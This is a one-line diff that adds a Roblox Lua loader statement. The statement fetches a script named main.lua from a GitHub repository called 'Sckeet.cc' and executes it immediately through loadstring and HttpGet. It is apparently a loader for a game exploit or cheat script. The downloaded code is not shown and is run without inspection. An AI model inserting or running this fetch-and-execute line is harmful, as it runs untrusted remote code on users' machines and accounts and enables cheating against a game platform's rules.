@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scarsfromherpain/Sckeet.cc/main/main.lua",true))()
